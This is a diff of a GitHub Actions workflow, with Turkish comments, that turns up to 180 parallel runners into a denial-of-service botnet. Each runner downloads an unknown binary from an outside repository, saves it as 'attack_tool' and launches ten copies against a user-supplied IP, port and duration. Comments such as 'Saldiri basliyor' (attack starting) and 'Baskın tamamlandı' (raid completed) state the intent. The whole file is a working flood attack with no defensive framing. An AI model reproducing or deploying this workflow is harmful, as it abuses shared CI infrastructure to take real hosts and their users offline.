@@ -1,4 +1,4 @@
-name: Attack-Node-${{ github.repository_id }} # Her repoda isim farklılaşsın
+name: Run Script Turbo
 
 on:
   workflow_dispatch:
@@ -10,41 +10,35 @@ on:
         description: "Target Port"
         required: true
       time:
-        description: 'Sure (Saniye)'
+        description: "Sure (Saniye)"
         required: true
-
-# BU KISIM KRİTİK: Repoların birbirini beklemesini engeller
-concurrency:
-  group: ${{ github.workflow }}-${{ github.run_id }}
-  cancel-in-progress: false
 
 jobs:
   vds:
     runs-on: ubuntu-latest
     strategy:
-      fail-fast: false # Bir makine hata verirse diğerlerini durdurma!
+      fail-fast: false
       max-parallel: 180
       matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50] # Test için 50 yap, açılırsa 180'e çek
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180]
 
     steps:
       - name: Prep
         run: |
-          wget https://github.com/urkwjrwmbewn/hoplatici.pl/raw/refs/heads/main/5 -O 5
-          chmod +x 5
+          wget https://github.com/urkwjrwmbewn/hoplatici.pl/raw/refs/heads/main/5 -O attack_tool
+          chmod +x attack_tool
           
-      - name: Turbo Fire
+      - name: Fire
         run: |
-          # Inputları çek
-          IP="${{ github.event.inputs.ip }}"
-          PORT="${{ github.event.inputs.port }}"
-          TIME_VAL="${{ github.event.inputs.time }}"
+          # Degiskenleri cek (Turkce karakter 'İ' kullanma!)
+          TARGET_IP="${{ github.event.inputs.ip }}"
+          TARGET_PORT="${{ github.event.inputs.port }}"
+          TARGET_TIME="${{ github.event.inputs.time }}"
           
-          # Her makinede 10 paralel işlem başlat (Sömürüyü artır)
+          echo "Saldiri basliyor: $TARGET_IP:$TARGET_PORT ($TARGET_TIME saniye)"
+          
           for i in {1..10}; do
-            sudo timeout "$TIME_VAL" ./5 "$IP" "$PORT" 500 1000 99999 "$TIME_VAL" > /dev/null 2>&1 &
+            sudo timeout "$TARGET_TIME" ./attack_tool "$TARGET_IP" "$TARGET_PORT" 500 1000 99999 "$TARGET_TIME" > /dev/null 2>&1 &
           done
           
-          # timeout komutu arka planda çalıştığı için makineyi uyutarak açık tutuyoruz
-          sleep "$TIME_VAL"
-          echo "Baskın tamamlandı."
+          sleep "$TARGET_TIME"
